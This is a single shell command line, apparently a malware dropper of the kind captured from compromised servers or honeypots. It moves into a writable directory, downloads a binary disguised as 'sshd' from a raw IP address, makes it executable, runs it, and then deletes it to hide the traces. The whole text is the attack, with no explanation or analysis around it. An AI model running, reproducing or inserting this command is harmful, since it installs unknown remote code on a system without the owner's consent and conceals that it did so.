cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.187.135.17/sshd; chmod +x sshd; ./sshd; rm -rf sshd
